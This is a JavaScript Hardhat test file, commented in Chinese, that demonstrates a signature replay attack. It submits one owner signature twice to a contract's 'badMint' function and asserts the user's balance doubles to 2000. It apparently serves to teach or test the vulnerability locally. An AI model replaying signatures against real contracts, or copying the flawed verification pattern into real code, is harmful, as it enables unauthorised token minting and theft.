const { expect } = require("chai");
const { verifyMessage } = require("@ethersproject/wallet");

describe("SignatureReplay", function () {
    let sigReplay;
    let owner;
    let user;

    beforeEach(async () => {
        [owner, user] = await ethers.getSigners();
        const SigReplay = await ethers.getContractFactory("SigReplay");
        sigReplay = await SigReplay.deploy();
        await sigReplay.deployed();
    });

    it("Should simulate signature replay attack", async () => {
        console.log(`owner address: ${owner.address}`);
        const messageHash = await sigReplay.getMessageHash(user.address, 1000);
        const ethHash = await sigReplay.toEthSignedMessageHash(messageHash);
        const signature = await owner.signMessage(ethers.utils.arrayify(messageHash));
    
        const verigyAddress = await sigReplay.verifyAddress(ethHash, signature);
        console.log(`verigyAddress: ${verigyAddress}`);
        // 第一次调用 badMint
        console.log(`badMint(${user.address}, 1000, ${signature})`);
        await sigReplay.badMint(user.address, 1000, signature);
        
        // 检查用户余额，应为 1000
        let userBalance = await sigReplay.balanceOf(user.address);
        expect(userBalance.toString()).to.equal('1000');
    
        // 使用相同的签名再次调用 badMint，模拟签名重放攻击
        await sigReplay.badMint(user.address, 1000, signature);
    
        // 检查用户余额，如果余额为 2000，说明签名重放攻击成功
        userBalance = await sigReplay.balanceOf(user.address);
        expect(userBalance.toString()).to.equal('2000');
    });
    
});